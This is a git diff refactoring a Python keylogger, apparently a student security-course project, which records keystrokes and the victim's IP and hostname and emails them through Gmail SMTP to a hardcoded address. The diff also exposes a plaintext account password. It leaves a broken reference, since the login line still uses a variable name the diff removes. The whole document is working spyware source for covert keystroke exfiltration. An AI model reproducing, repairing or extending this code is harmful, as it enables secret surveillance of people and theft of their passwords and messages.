@@ -11,14 +11,14 @@ import getpass
 import platform
 
 #Destination Email 
-destEmail = 'keylogsenderUIUC460@gmail.com'
-
+DEST_EMAIL = "keylogsenderUIUC460@gmail.com" 
 #Emails will be sent from this email account 
-srcEmail = "keylogsenderUIUC460" 
-srcPwd =  "qazwsxedcrfv"
+SRC_EMAIL = "keylogsenderUIUC460" 
+SRC_PWD =  "qazwsxedcrfv"
 
 #Emails will be sent out after this many characters have been collected (note "[CTRL]" is 6 chars)
-dataBufferSize = 500 
+DATA_BUFFER_SIZE = 500 
+
 
 #Exit program by pressing these buttons at the same time
 #You can customize this by adding :
@@ -42,7 +42,7 @@ holdDowns = ['Key.ctrl_l', 'Key.ctrl_r',
              'Key.shift', 'Key.shift_r',
              'Key.alt_l', 'Key.alt_r']
 
-def filterKeys(letter):
+def filterKeys(letter, released = False):
 	replacements = {
 		'Key.space': ' ',
 		'Key.ctrl_l': '[CTRL_L]',
@@ -82,16 +82,19 @@ def filterKeys(letter):
 		'Key.f12': '[F12]',
                 
 	}
-	return replacements.get(letter,letter)
-
+	filtered = replacements.get(letter,letter)
+	if(letter in holdDowns and released == True):
+		return filtered[:-1]+" RELEASED]"
+	return filtered
 def serverSetup():
-	global srcEmail, srcPwd
+	global SRC_EMAIL, SRC_PWD
 	server = smtplib.SMTP('smtp.gmail.com', 587)
 	server.starttls()
-	server.login(srcEmail, srcPwd)
+	server.login(srcEmail, SRC_PWD)
 	return server
 
 def send_data(msg, victimInfo):
+	global local, server
 	try:
                 IP = victimInfo.get('IP')
                 HostName = victimInfo.get('Hostname')
@@ -112,7 +115,7 @@ def send_data(msg, victimInfo):
 			f.write('{0}'.format(fullmsg))	
 		else:
 			print('sending data through EMAIL')
-			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, fullmsg)
+			server.sendmail(SRC_EMAIL, DEST_EMAIL, fullmsg)
 		print("sending complete")
 	except Exception as e:
 		print('Exception: ' + str(e))
@@ -122,14 +125,12 @@ def recordKey(key, release=False):
 		try:
 			data += str(key.char)
 		except AttributeError:
-			data += filterKeys(str(key))
-			print(filterKeys(str(key)))
-			if(release):
-				data+="<RELEASED>"
+			data += filterKeys(str(key), release)
+			print(filterKeys(str(key), release))
 		except Exception as e:
 			print('Exception: '+str(e))
 		finally:
-			if(len(data) > dataBufferSize):
+			if(len(data) > DATA_BUFFER_SIZE):
 				q.put(data)
 				data = ""
 def prepare_end():
